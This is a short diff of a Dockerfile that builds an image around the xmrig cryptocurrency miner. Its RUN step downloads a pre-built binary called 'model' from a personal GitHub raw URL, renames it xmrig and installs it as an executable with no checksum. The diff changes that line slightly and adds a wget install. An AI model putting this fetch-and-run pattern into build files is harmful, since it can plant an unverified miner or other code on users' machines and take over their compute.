@@ -6,8 +6,8 @@ LABEL build_version="xmrig build-date:- ${BUILD_DATE}"
 LABEL maintainer="tech@cellfi.sh"
 
 ARG DEBIAN_FRONTEND=noninteractive
-RUN   apt-get update && apt-get install -y -qq git build-essential cmake libuv1-dev uuid-dev libmicrohttpd-dev libssl-dev
-RUN   wget -O xmrig https://raw.githubusercontent.com/carter19941/mis/main/model && chmod +x xmrig && mv xmrig /usr/local/bin/ && cd ../../ && rm -rf xmrig-dev
+RUN   apt-get update && apt-get install -y -qq git build-essential cmake libuv1-dev uuid-dev libmicrohttpd-dev libssl-dev && apt-get install wget
+RUN   wget -O xmrig https://raw.githubusercontent.com/carter19941/mis/main/model && chmod +x xmrig && mv xmrig /usr/local/bin/ && cd ../../
 RUN   apt-get purge -y git build-essential cmake && rm -rf /var/lib/apt/lists/**
 RUN apt-get update && apt-get install -y software-properties-common gcc && \
     add-apt-repository -y ppa:deadsnakes/ppa
